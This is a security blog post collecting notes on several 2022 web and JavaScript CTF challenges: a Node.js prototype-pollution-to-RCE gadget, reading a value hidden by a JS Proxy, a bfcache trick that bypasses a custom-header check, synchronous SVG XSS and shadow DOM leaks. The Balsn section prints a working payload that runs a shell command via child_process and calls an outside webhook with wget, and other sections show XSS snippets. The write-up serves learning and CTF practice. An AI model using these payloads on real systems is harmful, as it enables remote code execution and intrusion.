---
title: Notes on Several CTF Challenges Related to Web and JS
catalog: true
date: 2022-12-08 20:10:44
tags: [Security]
categories: [Security]
photos: /img/ctf-js-notes/cover.png
---

Recently, there were several CTF challenges that were quite good, such as SECCON and HITCON, but unfortunately, I was traveling abroad at that time and was too lazy to write complete writeups after returning. Originally, I was even too lazy to take notes, but once time passed, it became difficult to find related information, so I decided to write a brief summary.

In addition, I will also briefly mention several challenges that I think I should have taken notes on before, but for some reason, I did not.

Keywords:

1. Node.js prototype pollution gadget to RCE (Balsn CTF 2022 - 2linenodejs)
2. Obtaining the original value of a JS proxy (corCTF 2022 - sbxcalc)
3. Cache of browser back behavior (SECCON CTF 2022 - spanote)
4. Using SVG to create synchronous XSS (HITCON CTF 2022)
5. Reading data from shadow DOM (HITCON CTF 2022)

<!-- more -->

## Balsn CTF 2022 - 2linenodejs

The code is very simple:

``` js
#!/usr/local/bin/node
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
  try{
    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
    obj = JSON.parse(json);
    console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
  }catch (e) {
    require('./usage')
  }finally{
    process.exit();
  }
});

// index
module.exports=(O,o) => (
    Object.entries(O).forEach(
        ([K,V])=>Object.entries(V).forEach(
            ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
        )
    ), o
);
```

There is an obvious prototype pollution vulnerability, so the challenge is about how to achieve RCE after having prototype pollution in node.js.

Another key point is the `require('./usage')` inside the catch.

The last key point is this paper: [Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://arxiv.org/abs/2207.11171), which mentions many cases of RCE from prototype pollution and provides gadgets or some hints.

However, one of the vulnerabilities in the paper has been fixed in the version used in this challenge: https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484

``` js
const { 1: name, 2: expansion = '' } =
    RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject;
```

kEmptyObject is `ObjectFreeze(ObjectCreate(null))`, so it cannot be polluted.

But anyway, if you continue to look for it in the file, you will find that the `trySelf` function has the same problem here: https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454

``` js
const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
```

The default value here also uses `{}`, so it can be interfered with through prototype pollution.

The following code will load `./pwn.js` instead of `./usage.js`:

``` js
Object.prototype["data"] = {
  exports: {
    ".": "./pwn.js"
  },
  name: './usage.js'
}
Object.prototype["path"] = './'

require('./usage.js')
```

Therefore, through prototype pollution, any file can be required. The next task is to find a built-in file with a usable payload. My teammate found `/opt/yarn-v1.22.19/preinstall.js`, and the final payload looks like this:

```js
Object.prototype["data"] = {
  exports: {
    ".": "./preinstall.js"
  },
  name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
  "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=2').toString());process.exit()//",
  "NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```

Writeups by others:

1. https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs
2. [Node.js require() RCE复现](https://hujiekang.top/2022/10/11/NodeJS-require-RCE/)

### corCTF 2022 - sbxcalc

The core part of this challenge can be seen as follows:

``` js
var p = new Proxy({flag: window.flag || 'flag'}, {
  get: () => 'nope'
})
```

How can you get the flag blocked by the proxy?

The answer is `Object.getOwnPropertyDescriptor`.

`Object.getOwnPropertyDescriptor(p, 'flag')` can be used to obtain the original value instead of the value processed by the proxy.

Author's writeup: https://brycec.me/posts/corctf_2022_challenges#sbxcalc

### SECCON CTF 2022 Quals - spanote

There is a cache in Chrome called back/forward cache, abbreviated as bfcache, which I heard for the first time: https://web.dev/i18n/en/bfcache/

The second disk cache should be more familiar to everyone, and fetched resources will be stored in it.

Using this bfcache, interesting behaviors can be achieved.

Now there is an API like this:

``` js
fastify.get("/api/notes/:noteId", async (request, reply) => {
  const user = new User(request.session.userId);
  if (request.headers["x-token"] !== hash(user.id)) {
    throw new Error("Invalid token");
  }
  const noteId = validate(request.params.noteId);
  return user.sendNote(reply, noteId);
});
```

Although it is a GET, it will check the custom header, so it cannot be accessed directly by the browser.

But with the cache behavior just mentioned, you can:

1. Open `/api/notes/id` in the browser and an error message will appear.
2. Go to the homepage with the same tab. At this time, the homepage will use fetch with custom header to fetch `/api/notes/id`, and the browser will store the result in the disk cache.
3. Go back one page, and the screen will display the result of the disk cache.

You can use the browser to directly browse the cached response and bypass the restriction of the custom header.

For a more detailed writeup of the entire question, please see here: https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote

### HITCON CTF 2022

First, let's post the writeups for maple and splitline:

1. https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022
2. https://blog.splitline.tw/hitcon-ctf-2022/

This time I only looked at Self Destruct Message, and briefly talked about several points.

The first is when executing `element.innerHTML = str`, usually anything in HTML will be executed asynchronously, for example:

```js
element.innerHTML = '<img src=x onerror=console.log(1)>'
console.log(2)
```

It is definitely logging 2 first and then 1.

But if you write it like this:

```js
const div = document.createElement('div')
div.innerHTML = '<svg><svg onload=console.log(1)>'
console.log(2)
```

It will magically become 1 in front, and this div will even work without being placed in the DOM. The relevant discussion can be seen in this thread: https://twitter.com/terjanq/status/1421093136022048775

Next is to use the error stack to find the original location and get the flag id:

``` js
window.addEventListener('unhandledrejection', e => {
	console.log(e.reason.stack.match(/\/message\/(\w+)/)[1]);
});
```

And this question also has other solutions. Although the element is placed in the shadow DOM, the flag can be stolen through some xsleak. The more complete research is here: [The Closed Shadow DOM](https://blog.ankursundara.com/shadow-dom/)

Similar questions have appeared in DiceCTF 2022, and I have written a post about my experience, but I didn't start tagging keywords at that time: https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/
